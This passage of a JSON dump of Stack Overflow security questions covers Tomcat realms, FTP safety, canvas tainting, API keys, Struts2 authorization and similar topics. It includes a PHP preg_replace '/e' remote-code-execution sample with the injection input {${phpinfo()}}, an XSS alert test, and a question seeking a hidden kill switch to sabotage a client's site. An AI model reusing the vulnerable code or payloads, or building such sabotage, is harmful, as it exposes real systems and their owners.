&lt;session-timeout&gt;\n            30\n        &lt;/session-timeout&gt;\n    &lt;/session-config&gt;\n\n    &lt;security-constraint&gt;\n        &lt;display-name&gt;Constraint1&lt;/display-name&gt;\n        &lt;web-resource-collection&gt;\n            &lt;web-resource-name&gt;ProviderManager&lt;/web-resource-name&gt;\n            &lt;description/&gt;\n            &lt;url-pattern&gt;/ProviderManager/*&lt;/url-pattern&gt;\n        &lt;/web-resource-collection&gt;\n        &lt;auth-constraint&gt;\n            &lt;description/&gt;\n            &lt;role-name&gt;tomcat&lt;/role-name&gt;\n        &lt;/auth-constraint&gt;\n    &lt;/security-constraint&gt;\n    &lt;login-config&gt;\n        &lt;auth-method&gt;FORM&lt;/auth-method&gt;\n        &lt;form-login-config&gt;\n            &lt;form-login-page&gt;/ProviderManager/login.jsp&lt;/form-login-page&gt;\n            &lt;form-error-page&gt;/ProviderManager/error.jsp&lt;/form-error-page&gt;\n        &lt;/form-login-config&gt;\n    &lt;/login-config&gt;\n    &lt;security-role&gt;\n        &lt;description/&gt;\n        &lt;role-name&gt;tomcat&lt;/role-name&gt;\n    &lt;/security-role&gt;\n&lt;/web-app&gt;\n</code></pre>\n\n<p><strong>tomcat-users.xml</strong></p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;tomcat-users&gt;\n\n  &lt;role rolename=\"tomcat\"/&gt;\n  &lt;role rolename=\"role1\"/&gt;\n\n  &lt;user username=\"tomcat\" password=\"tomcat\" roles=\"tomcat\"/&gt;\n  &lt;user username=\"both\" password=\"tomcat\" roles=\"tomcat,role1\"/&gt;\n  &lt;user username=\"role1\" password=\"tomcat\" roles=\"role1\"/&gt;\n\n  &lt;user username=\"ide\" password=\"mgPNx5x5\" roles=\"manager-script,admin\"/&gt;\n&lt;/tomcat-users&gt;\n</code></pre>\n\n<p><strong>login.html</strong></p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;%@page contentType=\"text/html\" pageEncoding=\"UTF-8\"%&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt;\n        &lt;title&gt;JSP Page&lt;/title&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n        &lt;form action=\"j_security_check\" method=\"POST\"&gt;\n           Username:&lt;input type=\"text\" name=\"j_username\"&gt;&lt;br&gt;\n           Password:&lt;input type=\"password\" name=\"j_password\"&gt;\n           &lt;input type=\"submit\" value=\"Login\"&gt;\n        &lt;/form&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>Thanks-in-advance,</p>\n\n<p>Guido</p>\n"},{"tags":["android","security","data","policy"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12644536,"title":"Wipe Application Data Only","body":"<p>im Devlopping a 'Security' Application and im currently using Device Policy Manager , i can Successful do a Wipe , but im looking to Wipe All Application Data Only or Wipe Data from the Specified App Ex. : Wipe Kik Messenger Data(Conversation , Login ...) and keep all Applications ( especially My Application) i dont want a full Factory Reset or wipe /Data/App/ , is there any Way to do this ? Also , no matter if the device Require Root Access for your Given Solution(if you have one) ,</p>\n\n<p>Thanks .</p>\n"},{"tags":["security","ftp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":12644194,"title":"Security: FTP transfer on a public network","body":"<p>I have heard of security issues with the way FTP username and password is sent to the server for authentication. Is it safe to use FTP on a public network?</p>\n\n<p>In particular I use Notepad++ with ftp plugin that synch the file with the server on save (via ftp).</p>\n\n<p>Is it unsafe to be on a public network (say a university campus) and use FTP to connect to your server?</p>\n"},{"tags":["javascript","html5","security","canvas"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12643150,"title":"Why does browser limit usage of image from other domain in canvas?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12636697/why-does-my-navigator-tainted-a-canvas-when-an-image-from-an-other-domain-is-use\">Why does my navigator tainted a canvas when an image from an other domain is used?</a>  </p>\n</blockquote>\n\n\n\n<p>This is a reformulation of one of my precedent questions : <a href=\"http://stackoverflow.com/questions/12636697/why-does-my-navigator-tainted-a-canvas-when-an-image-from-an-other-domain-is-use\">one of my precedent questions</a></p>\n\n<p>For security reason a browser will limit usage of some function on a canvas after using an image from an other domain.</p>\n\n<p>What are this security reason? How can an image display in a canvas present a risk?</p>\n"},{"tags":["javascript","css","security","design","web"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":15,"view_count":141,"score":-15,"question_id":12643451,"title":"Locking Down a Website","body":"<p>I have a client I'm building a website for that plans on paying me after I'm complete.</p>\n\n<p>I'm building on their FTP.</p>\n\n<p>Is there any techniques to lock down the website to have it mess up completely when activated by me if they refuse to pay?</p>\n\n<p>Thanks </p>\n"},{"tags":["security","tomcat","struts2","spring-security","roles"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":139,"score":0,"question_id":12552383,"title":"Struts2 Authorization","body":"<p>I am about to graduate from university with a web application that needs be implemented at school, everything is working perfect and this needs to be ready before november but I'm having a real trouble taking care of the security. The application must be able to have different users with one or more different roles, ( user1: roles: student; user 2: admin, user 3: professor, boss ).</p>\n\n<p>When a user logs in it should be redirected to a different view depending on the roles it has and then if he tries to access to resources not allowed for his role, an error page should be shown.</p>\n\n<p>This is what I've tried so far:</p>\n\n<p><strong>Method 1:</strong> </p>\n\n<p>Authentication Method: Specified in web.xml as</p>\n\n<pre><code>&lt;login-config&gt;\n   &lt;auth-method&gt;FORM&lt;/auth-method&gt;\n   &lt;form-login-config&gt;\n      &lt;form-login-page&gt;/login.jsp&lt;/form-login-page&gt;\n   &lt;/form-login-config&gt;\n&lt;/login-config&gt;\n</code></pre>\n\n<p>Then using the names j_username and j_password along with j_security_check on a custom jsp.</p>\n\n<p>Authorization Method: Used Container Security (Tomcat) via <a href=\"http://tomcat.apache.org/tomcat-7.0-doc/realm-howto.html#DataSourceRealm\" rel=\"nofollow\">DataSourceRealm</a>, wich allow us to connect to a database and get the user and the roles associated with him from 2 Tables that need to be mapped in the server.xml:</p>\n\n<pre><code>&lt;Resource auth=\"Container\" driverClassName=\"com.microsoft.sqlserver.jdbc.SQLServerDriver\" maxActive=\"100\" maxIdle=\"30\" maxWait=\"1000\" name=\"jdbc/sstt\" password=\"pass\" type=\"javax.sql.DataSource\" url=\"jdbc:sqlserver://localhost;databaseName=BDTT\" username=\"sa\"/&gt;\n</code></pre>\n\n<p>web.xml:</p>\n\n<pre><code>&lt;security-constraint&gt;\n\n    &lt;web-resource-collection&gt;\n        &lt;web-resource-name&gt;Students Only&lt;/web-resource-name&gt;\n        &lt;url-pattern&gt;/student/*&lt;/url-pattern&gt;\n    &lt;/web-resource-collection&gt;\n\n    &lt;auth-constraint&gt;\n        &lt;role-name&gt;student&lt;/role-name&gt;\n    &lt;/auth-constraint&gt;\n\n&lt;/security-constraint&gt;\n\n// Same mapping for professor, admin, and boss (/professor/* maps to professor role)\n</code></pre>\n\n<p><strong>Results:</strong> Whenever I tried to access a restricted area, for example, /members/ (configured in the web.xml inside a security constraint) it would work just perfect, so authorization goal was achieved.</p>\n\n<p><strong>The problem:</strong> \nWhen I submit the login form it fires the j_security_check so I'm not able to fire a Struts2 Action that could help me to <strong>redirect depending on the user roles</strong> this is the main problem. Everything was perfect but I can't find a way to redirect after logging in with the Container security. </p>\n\n<p><strong>Method 2:</strong> </p>\n\n<p>Authentication Method: A LoginAction class that queries the database and checks if the password is correct. It also checks on the user roles and here we should be able to return a String like \"admin\", or \"student\" and redirect to the appropriate index.jsp resource, but that would work <strong>only if users were allowed to have only one role, but they can have many</strong>, so <strong>how should the view be constructed depending on the total user roles</strong>? What String would we return?</p>\n\n<p>Authorization Method: I wrote a custom Interceptor wich retrieves the User object from the session (this User object should be in the session only if the user authenticated successfully) and then perform the authorization logic here. </p>\n\n<p><strong>The problem:</strong> \nUnable to find a way to construct a view depending on several roles, and the problem about the Interceptor is that it only protects my actions, so the authorization goal was achieved but only on actions, that means I could write /students/ and the URL would change to /students/index.jsp without even trying to authorize.</p>\n\n<p><strong>Other plans</strong></p>\n\n<p>I was thinking that maybe I could use filters to achieve the authorization ( that way I could protect both the dynamic and static resources ) but I don't know if that would be a good practice since we have configured the Struts2 filter which maps to /*</p>\n\n<p>I was also looking that I could use <strong>JAAS</strong> or <strong>Spring Security</strong> but I don't know if I could achieve this, <strong>authenticate, redirect based on roles and authorizate</strong>. I wouldn't want to spend more several hours to find out that I can't do what I need, and I have just a very short time to finish this.</p>\n\n<p><strong>Other questions</strong></p>\n\n<p>Is it really a good practice to put jsp under WEB-INF? if so I should rewrite all the access to my jsp's in the struts.xml to WEB-INF/jsp/students/index.jsp? ( for example ). Or should I stick to a security constraint defined in web.xml to avoid direct access to the /jsp/* url pattern?</p>\n\n<p>Thank You very much in advance for all your time and help.</p>\n"},{"tags":["windows","security","internet-explorer","winapi"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":67,"score":1,"question_id":12642575,"title":"Changing Internet Explorer settings programmatically","body":"<p>In Internet Explorer, <strong>Internet Options -> Advanced</strong> we have Multiple <strong>check-box</strong> for settings.</p>\n\n<p>I want to programmatically manage all of them.</p>\n\n<p>I looked at Internet Explorer API but doesn't find much.</p>\n\n<p><strong>Edit</strong></p>\n\n<p>I want specifically Uncheck these two check boxes</p>\n\n<p><img src=\"http://i.stack.imgur.com/wYr49.jpg\" alt=\"enter image description here\"></p>\n\n<p>Please suggest.</p>\n"},{"tags":["c#","security","rest"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":36,"score":3,"question_id":12640662,"title":"Rest service sercurity","body":"<p>I have various c# rest services performing normal CRUD tasks on a database,</p>\n\n<p>For example, I have a rest service to add a customer to my customers database table which will expect XML as indicated below,</p>\n\n<pre><code>&lt;CreateCustomerRequest&gt;\n    &lt;Name&gt;Customer name&lt;/Name&gt;\n    &lt;Surname&gt;Customer surname&lt;/Surname&gt;\n&lt;/CreateCustomerRequest&gt;\n</code></pre>\n\n<p>Anyone that knows the URL and the proper XML structure can therefore call the rest service and insert a customer into my database. What is the best way to make sure that unauthorized inserts are not performed? Perhaps a key send with the request calculated as MD%([name field] + [surname field] + [shared client/server key]??</p>\n"},{"tags":["android","security","encryption","filesystems"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12640708,"title":"Check if Android filesystem is encrypted","body":"<p>We are developing secure application for Android. It's required for users to keep filesystems of their devices encrypted, but we have to check this fact and forbid to use app. Is it possible to check if filesystem is encrypted? Also there are some devices with Android &lt; 3.0 that supports encryption, for example Motorola RAZR. It would be interesting to know about encryption on such devices.</p>\n"},{"tags":["c#","wcf","security","ws-discovery","xp-mode"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12632650,"title":"WCF Discovery in XP mode","body":"<p>From <a href=\"http://msdn.microsoft.com/en-us/magazine/ee335779.aspx\" rel=\"nofollow\">Discover a New WCF with Discovery</a> example, I modified </p>\n\n<pre><code>      public static Uri AvailableTcpBaseAddress\n      {\n         get\n         {\n            //return new Uri(\"net.tcp://localhost:\" + FindAvailablePort() + \"/\");\n            return new Uri(\"net.tcp://\" +  ipAddr() + \":\" + FindAvailablePort() + \"/\");\n         }\n      }\n\n      private static string ipAddr()\n      {\n          return Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(ip =&gt; ip.AddressFamily == AddressFamily.InterNetwork).ToString();\n      }\n</code></pre>\n\n<p>By changing <code>localhost</code> to <code>ipAddr()</code>, I am able to test the UDP WCF discovery from two separate machines in the same subnet. (Note: Without the change, the example only work if both host and client on the same machine). To ease my development, I would like to test in my Windows 7 XP mode, so I do not need to bring two machines. However, either I run host or client on XP mode, I got \"<strong>the server has rejected the client credentials</strong>\" error. Answer from <a href=\"http://stackoverflow.com/a/8845369/418439\">http://stackoverflow.com/a/8845369/418439</a> could not help me as it is for netTcpBinding.</p>\n"},{"tags":["php","javascript","web-services","security","solr"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12629598,"title":"Securely Query Solr with Javascript","body":"<p>I have a Solr server setup, working great, and sitting behind an Apache proxy server which limits access to a range of IP's.</p>\n\n<p>To date our application(built in ZF/PHP) would use a PHP proxy function to query the Solr instance.(the ZF server's IP is allowed) however, I've been testing a new interface and have noticed querying Solr directly from JS is light-years faster than using PHP code to proxy things.  </p>\n\n<p>The page I'm testing runs 25+ solr queries per page load.  Using pure JS this loads great,  using PHP -not even close to usable.</p>\n\n<p>Is there a way to proxy the client-side using jQuery or something much faster than PHP?</p>\n\n<p>I've been searching for days, reading on various types of proxies, reverse proxies, securely querying webservices without exposing keys, etc.. But I'm still a bit lost as to the best way to query services using JS.  </p>\n\n<p>Any tutorials or advice would be much appreciated, cheers!</p>\n"},{"tags":["javascript","security","node.js","deployment","obfuscation"],"answer_count":2,"favorite_count":2,"up_vote_count":6,"down_vote_count":1,"view_count":1096,"score":5,"question_id":9413123,"title":"Secure distribution of NodeJS applications","body":"<p><strong>What:</strong> Can NodeJS apps be distributed as binary? ie. you compile the .js app via V8 into its native binary, and distribute the binary to clients? (if you had total access to the NodeJS server)... or is minifying the code all you can do?</p>\n\n<p><strong>Why:</strong> We build serverside applications in NodeJS for clients, that have often to be hosted on the client's servers. Distributing source code means clients can easily steal our solution and stop paying licensing fees. This opens up the possibility of easy reverse-engineering or reuse of our apps without our awareness.</p>\n"},{"tags":["javascript","ajax","web-services","security","wcf-web-api"],"answer_count":5,"favorite_count":7,"up_vote_count":18,"down_vote_count":0,"view_count":1730,"score":18,"question_id":6302341,"title":"Web services API Keys and Ajax - Securing the Key","body":"<p>This is probably a generic security question, but I thought I'd ask in the realm of what I'm developing.</p>\n\n<p>The scenario is: A web service (WCF Web Api) that uses an API Key to validate and tell me who the user is, and a mix of jQuery and application on the front ends.</p>\n\n<p>On the one hand, the traffic can be https so it cannot be inspected, but if I use the same key per user (say a guid), and I am using it in both then there's the chance it could be taken and someone could impersonate the user.</p>\n\n<p>If I implement something akin to OAuth, then a user and a per-app key is generated, and that could work - but still for the jQuery side I would need the app API key in the javascript.</p>\n\n<p>This would only be a problem if someone was on the actual computer and did a view-source.</p>\n\n<p>What should I do?</p>\n\n<ol>\n<li>md5 or encrypt the key somehow?</li>\n<li>Put the key in a session variable, then when using ajax retrieve it?</li>\n<li>Get over it, it's not that big a deal/problem.</li>\n</ol>\n\n<p>I'm sure it's probably a common problem - so any pointers would be welcome.</p>\n\n<p><strong>To make this clearer</strong> - this is my API I have written that I am querying against, not a google, etc.  So I can do per session tokens, etc, I'm just trying to work out the best way to secure the client side tokens/keys that I would use.</p>\n\n<p>I'm being a bit overly cautious here, but just using this to learn.</p>\n"},{"tags":["java","spring","security","spring-security"],"answer_count":2,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":263,"score":7,"question_id":10240989,"title":"Spring security authentication management vulnerability","body":"<p>Spring documentation says that remember me is implemented by storing following information in cookie - </p>\n\n<blockquote>\n  <p>base64(username + \":\" + expirationTime + \":\" + md5Hex(username + \":\" +\n  expirationTime + \":\" password + \":\" + key))</p>\n</blockquote>\n\n<p>I have following confusions - </p>\n\n<ol>\n<li><p>Why use an unsecure hash like MD5 to digest the information instead of using SHA-1 or SHA-2. Would the performance hit from these be significant for such a small piece of information?</p></li>\n<li><p>Why transmit this information over the network at all? Why not maintain a map of cryptographically secure random number and this info on the server, returning only the map key as a cookie. AFAIK this is the approach used by Servlet API and is deemed more secure.</p></li>\n</ol>\n"},{"tags":["javascript","security","search","internet","xss"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12637828,"title":"Difference between typing and pasteing in a field","body":"<p>If I use xss, what's the difference between typing in ALERT('DSSA');, or just paste it to a search textfield? In a site, typing works, and makes the alert, but if I just paste it, than it doesn't. To prevent the question, I don't want to hack any site, I'm just interested in network security.</p>\n\n<p>thanks for the answer</p>\n"},{"tags":["php","security","code-injection"],"answer_count":2,"favorite_count":4,"up_vote_count":11,"down_vote_count":0,"view_count":88,"score":11,"question_id":12636586,"title":"What is {${phpinfo()}} called? (Remote Command Execution related)","body":"<p>I hope someone can answer this for me as I've been fairly curious about it for quite some time, haven't seemed to be able to obtain an answer though.\nHowever, I'm sure someone here will be able to as there are some very intelligent people here.</p>\n\n<p>Now, to the question.\nI'll be using a Remote Command Execution vulnerability as an example.</p>\n\n<pre><code>&lt;?php echo preg_replace('/(.*)/e', 'strtoupper(\"\\\\1\")', $argv[1]); ?&gt;\n</code></pre>\n\n<p>To exploit this the attacker would simply input <code>{${phpinfo()}}</code> for example.\nMy questions are as follows:</p>\n\n<ol>\n<li>What are the braces <code>{}</code> for and why does it look like a\nvariable?</li>\n<li>Does it have a name of some kind? I don't believe it's a variable function since they're different, no?</li>\n</ol>\n\n<p>Thank you!</p>\n"},{"tags":["javascript","html5","security","canvas"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":36,"score":2,"question_id":12636697,"title":"Why does my navigator tainted a canvas when an image from an other domain is used?","body":"<p>When you put an image from an other domain in a canvas, the canvas is tainted and some functions like getDataURL or getImageData are disable.</p>\n\n<p>When you try to use such function a SECURITY_ERROR error happen.</p>\n\n<p>Why is this protection in place? What sort of attack used this method? </p>\n\n<p>Thanks!</p>\n\n<p>edited : </p>\n\n<p>I should ask : How can an image coming from an other domain be used in a attack?\n   I can't figure out why browser limit used of canvas after beeing tainted.   </p>\n"},{"tags":["security","tomcat","realm"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12636167,"title":"How to restrict users from directly accessing login.jsp?","body":"<p>I'm using the realm feature of tomcat and users not authenticated will be redirected to login.jsp. However if a user directly signs in using that page, he will be given a \"HTTP Status 400 - Invalid direct reference to form login page\" error.  </p>\n\n<p>So I'm thinking of a way that could avoid accessing that page directly? How can I achieve that? Thanks.</p>\n"},{"tags":["php","forms","security","email","spam"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":12635651,"title":"PHP secure email is blocking the false emails but letting the registration go through","body":"<p>I am trying to make a form that is secure from spam and sends a simple email to the person who registers. </p>\n\n<p>Im quite new to PHP and the problem im faced with is when the form is submitted with a false email address in the email field, it brings up the error message stating that the email is invalid, but still lets the registration go through adding it to the database.</p>\n\n<p>here is the code</p>\n\n<pre><code>function spamcheck($field) {\n    // filter_var() sanitizes the e-mail\n    // address using FILTER_SANITIZE_EMAIL\n    $field = filter_var($field, FILTER_SANITIZE_EMAIL);\n\n    // filter_var() validates the e-mail\n    // address using FILTER_VALIDATE_EMAIL\n    if(filter_var($field, FILTER_VALIDATE_EMAIL)) {\n        return TRUE;\n    }\n    else {\n        return FALSE;\n    }\n}\n\nif(isset($_REQUEST['email'])) {\n    // if \"email\" is filled out, proceed\n    // check if the email address is invalid\n    $mailcheck = spamcheck($_REQUEST['email']);\n    if ($mailcheck==FALSE) {\n        die(\"&lt;font color='red'&gt;Your email address is invalid, please try again.&lt;/font&gt;&lt;br/&gt;&lt;br/&gt;&lt;form&gt;&lt;INPUT TYPE='button' VALUE='Back' onClick='history.go(-1);return true;'&gt;&lt;/form&gt;\");\n    }\n    else {//send email\n        $to = \"$email\";\n        $from = \"name@mywebsite.com\";\n        $message = \"Just a message\";\n        $subject = \"Subject\";\n\n        mail($to, $message, $subject, \"From: $from\", \"-f$from\");\n    }\n}\n</code></pre>\n\n<p>Any help would be greatly appreciated.</p>\n"},{"tags":["java","security","java-web-start","webstart"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12633227,"title":"Client security of Java Web Start","body":"<p>I am deploying an application with java web start, but I am encountering a problem.</p>\n\n<p>When I complete the deployment, I replace the <code>jar</code> package in client's cache directory with another <code>jar</code> package, but the application runs the  latter <code>jar</code>. I have configured the security attributes in the <code>JNLP</code> file and signed the <code>jar</code> package  by <code>keytools</code>.I think the <code>JWS</code> should check the  <code>jar</code> package legitimacy, and it should not run after being changed.</p>\n\n<p>How does the <code>JWS</code> checks the local signed <code>jar</code> package has been changed?</p>\n"},{"tags":["android","security","ice-cream-sandwich","bouncycastle"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":11463924,"title":"Running apps using bouncy castle on ICS","body":"<p>I have developed an application that uses bouncy castle provider for generating keystore. Everything was working fine on Gingerbread(2.3.3) until i updated my test device with ICS. Now, its not able to find the bouncy castle provider. \nI'm getting this exception:</p>\n\n<p>07-11 12:40:51.317 E/AndroidRuntime( 8049): Caused by: java.lang.NoClassDefFoundError: org.bouncycastle.jce.provider.BouncyCastleProvider</p>\n\n<p>I searched about this and figured that in ICS, a trust store has been introduced and i want to know whether bouncy castle can still be used in ICS. I have seen some threads related to bouncy castle provider, but couldn't get the solution. Please help.</p>\n\n<p>Thanks,\nDeepak</p>\n"},{"tags":["asp.net","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12633173,"title":"Asp.Net website link when clicked from Word document throws runtime error","body":"<p>e are facing a strange error. \nI have an asp.net4.0 website which is running fine. But if someone put it's link in a word document and clicks first time it works but when clicked second time it throws runtime error.</p>\n\n<p>=============== Application Warning ==========\nEvent code: 3003 \nEvent message: A validation error has occurred. \nEvent time: 9/27/2012 5:11:47 PM \nEvent time (UTC): 9/27/2012 10:11:47 PM \nEvent ID: 17a66c61de004c17a6d562fc7b355ac1 \nEvent sequence: 4 \nEvent occurrence: 1 \nEvent detail code: 0 </p>\n\n<p>Application information: \n    Application domain: /LM/W3SVC/3/ROOT-2-129932570396136079 \n    Trust level: Full \n    Application Virtual Path: / \n    Application Path: E:\\Inetpub\\wwwroot\\ </p>\n\n<p>================================================</p>\n\n<p>Exception information</p>\n\n<p>Exception information: \nException type: HttpRequestValidationException \nException message: A potentially dangerous Request.Form value was detected from the client </p>\n\n<p>===================================================================</p>\n\n<p>I am not able to conclude the reason behind this issue.</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["iphone","security","encryption","client-server"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12630923,"title":"How to prevent connection to the server without my client application?","body":"<p>A client asked me to do a back-end server for its iPhone application and want only users who bought the application to be able to call the server.\nThe problem is that he doesn't want to add a login system to the application, so that it seems to me there is no completely safe way to prevent someone without his application calls the server.\nIn any case, even if it can not be completely prevented, it would be sufficient to make it difficult to access servers without the application.</p>\n\n<p>What is the best way to achieve this? Again, I do not need to fully protect the connection, there is no transit of sensitive information, I just want to make things a little more complicated for people who want to take advantage of server without paying the application.</p>\n\n<p>The idea that seems most simple is to encrypt the data with a key stored within the client and known to the server, so that the message can be decrypted only decompiling the code and finding the key (of course instead of a key you could put a list of keys, which change every 6/12/24 hours).</p>\n\n<p>Could this be a reasonable solution?</p>\n"},{"tags":["javascript","security","obfuscation","research","malicious"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":10835832,"title":"Collection of malicious or obfuscated Javascript?","body":"<p>I'm working on an academic project involving analysing obfuscation, and I'd like to find a reasonably sizeable collection of Javascript code known (or at least suspected) to be obfuscated to work with. My initial idea is that security organisations might provide collections of malicious code for research purposes, which is likely to be obfuscated in some way, but so far my searches have been fruitless.</p>\n\n<p>Do you know of any good sources? Many thanks.</p>\n"},{"tags":["asp.net-mvc-3","security","authorization","action-filter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12631325,"title":"ActionFilterAttribute for Authorization","body":"<p>I need to implement some authorization mechanism in my application. The authorization is based on object which are sent from client to serwer. Every action in a controller take as an argument List. Based on nested property of objects in this list I have to grant or deny access to controller action. My first approach was to use custom filter attribute </p>\n\n<pre><code>public class CustomAuthAttribute : FilterAttribute,IAuthorizationFilter\n{\n    public void OnAuthorization(AuthorizationContext filterContext)\n    {\n        //SOME LOGIC HERE\n    }\n}\n</code></pre>\n\n<p>However, because of the fact that the request is json request, it is hard for me to get values of every relevant property of sent objects (I have only acces to json values). That is why I thought that I could use ActionFilterAttribute instead of FilterAttribute.</p>\n\n<pre><code> public class ActionFilterAuthorization: ActionFilterAttribute\n{\n    public override void OnActionExecuting(ActionExecutingContext filterContext)\n    {\n\n        var castedList = filterContext.ActionParameters[\"key\"] as List&lt;MyObject&gt;;\n        //logic here \n\n       //throw exception is access is not granted\n\n    }\n}\n</code></pre>\n\n<p>The question is if this is good solution for authorization? Maybe it would be better to check authorization inside of actions ?? </p>\n"},{"tags":["git","security","github","git-push","git-reset"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12627509,"title":"is there any security issues if i add the public key of a public host to my github's accout?","body":"<p>that means others may push to my git repos which are hosted on github, so can anybody use</p>\n\n<pre><code>git reset --hard first-commit-id\ngit push\n</code></pre>\n\n<ol>\n<li><p>will this destroy my git repos hosted on github?</p></li>\n<li><p>will i lost of my history, if some bad guy run the above command?</p></li>\n</ol>\n\n<p>this issue is not the same as <a href=\"http://stackoverflow.com/questions/6742555/how-do-i-remove-my-public-key-from-github\">how do I remove my public key from github?</a></p>\n"},{"tags":["security","asp.net-mvc-4","asp.net-web-api"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":115,"score":1,"question_id":12551479,"title":"Can / Should I use SWT or SAML tokens for MVC 4 WebAPI project?","body":"<p>I have setup my ACS in Azure.\nI have created a MVC 4 WebAPI Project.\nI have added \"Identity and Access\" in visual studio 2012.</p>\n\n<p>This are running. but when i lauch the application i get the following:\nID4014: A SecurityTokenHandler is not registered to read security token ('BinarySecurityToken', 'http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd').</p>\n\n<p>The problem is that i told ACS to use SWT instead of SAML 2.0. From what I have seen in guides about securing a restfull wep api, swt was the way to go. </p>\n\n<p>If i change to SAML 2.0 it all works in the web interface. But how will this work out when i write a client for Windows Store (Metro) or other clients to get data from the WebAPI part of the project?</p>\n\n<p>Any advice to continue. Should I use SWT, and how do it make it work. Should I use SAML 2.0 and what should i then handle the authenticaitno later in a Windows Store Client?</p>\n"},{"tags":["javascript","asp.net-mvc","security","plugins","webbrowser"],"answer_count":1,"favorite_count":2,"up_vote_count":31,"down_vote_count":1,"view_count":585,"score":30,"question_id":9418891,"title":"How do I integrate Perfidies (Browser plug-in vulnerability scanner) into my website?","body":"<p><a href=\"https://github.com/ozten/Perfidies-of-the-Web/tree\">Perfidies</a> / <a href=\"https://github.com/lmorchard/plugindir\">Plugindir</a> is the client to <a href=\"https://wiki.mozilla.org/PFS2#Codebases\">Mozilla's plugin vulnerablity database</a>.  I think a variant of this is used here on <a href=\"http://www.mozilla.org/en-US/plugincheck/\">this site geared for end users</a>.</p>\n\n<p>I would like to redirect any browser that is using an old version of Java, Silverlight, Flash, etc to a \"quarantine\" page asking them to upgrade their browser before they are permitted to log in.</p>\n\n<ul>\n<li><p>What technical changes do I need to make to accomplish this?</p></li>\n<li><p>What Perfidies specific javascript objects must I become aware of?</p></li>\n<li><p>Are there any deployment concerns or modifications I should make?</p></li>\n</ul>\n\n<p>...\n...</p>\n"},{"tags":["web-services","security","authentication","credentials"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12628921,"title":"What's a smart way of storing user credentials for an external site (that does not use OAuth)?","body":"<p>I realize that in general, you should not store user credentials directly (i.e., in plain text); rather, it is best to store some encrypted form of them.</p>\n\n<p>However, suppose I create a website that interacts with some other 3rd party site; and let's say this 3rd party site offers an API that requires the user's credentials (with that site) for authentication.</p>\n\n<p>If my goal is to, say, provide a superior UI or introduce additional functionality on top of the services provided by this 3rd party, then it seems to me I need to actually store the user's credentials somehow so that I can use the API—not the user's password for <em>my</em> site (I can hash &amp; salt that one), but for the external site.</p>\n\n<p>Is there a \"right\" way to do this? My initial thinking is to store the credentials encrypted in some form such that they can be decrypted on the server for purposes of making API calls to the 3rd party service. This would mean that an attacker would need to understand how the encryption/decryption works in order to steal the user's external passwords. However, that does not seem so far-fetched to me; a clever hacker who had already breached the server hosting my application would probably be able to get at the code and figure it out pretty easily.</p>\n\n<p>So, that approach seems like better than nothing but not exactly great. Are there other strategies that people use? Is this entire concept (interacting with a 3rd party service requiring user credentials) ill-advised?</p>\n\n<p>I have to believe there is at least some reasonably secure way of dealing with this situation since it seems relatively common among even some fairly high-profile websites (e.g., Mint.com).</p>\n\n<p><strong>Update</strong>: Just to clarify: I am aware that in an ideal world, the 3rd party service would implement some version of OAuth (or an equivalent) so that I would not have to store credentials. Unfortunately, the reality in this case is that the 3rd party service requires user name and password to be sent in every API request. So is the consensus that I'm hearing, then, that in this case most developers would just refuse to use the service (and most likely suggest to them that they implement OAuth)?</p>\n"},{"tags":["security","login"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12620124,"title":"Admin access through a GET parameter","body":"<p>I'm working on a really simple web site. I usually do a full blown admin to edit the site, but this time I thought about editing in place (contenteditable=\"true\").</p>\n\n<p>To simplify login for the user, I'd like to just give him 